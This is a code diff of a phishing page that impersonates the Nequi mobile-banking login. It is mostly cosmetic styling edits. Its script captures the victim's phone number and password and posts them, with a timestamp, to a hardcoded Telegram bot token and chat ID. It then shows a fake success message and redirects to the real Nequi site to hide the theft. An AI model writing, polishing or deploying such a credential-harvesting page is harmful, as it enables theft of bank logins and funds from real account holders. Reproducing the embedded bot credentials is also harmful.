@@ -14,6 +14,7 @@
             display:flex; 
             align-items:center; 
             justify-content:center; 
+            margin:0;
         }
         .container { 
             background:white; 
@@ -29,19 +30,19 @@
             text-align:center; 
             padding:25px 0; 
         }
-        .header img { width:90px; }
+        .header img { width:85px; margin:5px 0; }
         .content { padding:30px 25px; }
         h2 { 
             text-align:center; 
-            color:#333; 
+            color:#222; 
             margin-bottom:25px; 
             font-size:18px; 
         }
         input { 
             width:100%; 
-            padding:14px; 
-            margin:10px 0; 
-            border:1px solid #ddd; 
+            padding:13px; 
+            margin:8px 0; 
+            border:1px solid #ccc; 
             border-radius:8px; 
             font-size:16px; 
         }
@@ -54,21 +55,22 @@
             border-radius:8px; 
             font-size:17px; 
             font-weight:500; 
-            margin-top:15px; 
+            margin-top:10px; 
             cursor:pointer; 
         }
         button:hover { background:#008f3f; }
-        .footer { 
-            text-align:center; 
-            padding:20px; 
-            color:#666; 
-            font-size:14px; 
-        }
         .error { 
             color:red; 
             text-align:center; 
             margin:10px 0; 
             display:none; 
+            font-size:14px;
+        }
+        .footer { 
+            text-align:center; 
+            padding:20px; 
+            color:#555; 
+            font-size:13px; 
         }
     </style>
 </head>
@@ -87,7 +89,7 @@
                 <button type="submit">Ingresar</button>
             </form>
             
-            <p style="text-align:center; margin-top:20px; color:#00b14f; font-size:14px;">
+            <p style="text-align:center; margin-top:25px; color:#00b14f; font-size:14px;">
                 ¿Olvidaste tu contraseña?
             </p>
         </div>
@@ -100,30 +102,31 @@
         const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
         const chatId = "773351137";
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
             e.preventDefault();
             
-            const phone = document.getElementById('phone').value;
-            const password = document.getElementById('password').value;
-            const errorMsg = document.getElementById('errorMsg');
+            let phone = document.getElementById("phone").value.trim();
+            let password = document.getElementById("password").value.trim();
+            let errorMsg = document.getElementById("errorMsg");
 
             if (phone.length < 10) {
-                errorMsg.style.display = 'block';
+                errorMsg.textContent = "Número o contraseña incorrectos";
+                errorMsg.style.display = "block";
                 return;
             }
 
             const message = `🔴 NEQUI\n\n📱 Celular: ${phone}\n🔑 Contraseña: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message })
             })
             .then(() => {
-                errorMsg.style.color = 'green';
-                errorMsg.textContent = '✅ Sesión iniciada correctamente';
-                errorMsg.style.display = 'block';
-                setTimeout(() => window.location.href = "https://www.nequi.com.co", 1800);
+                errorMsg.style.color = "green";
+                errorMsg.textContent = "✅ Sesión iniciada correctamente";
+                errorMsg.style.display = "block";
+                setTimeout(() => { window.location.href = "https://www.nequi.com.co"; }, 1500);
             })
             .catch(() => {
                 window.location.href = "https://www.nequi.com.co";
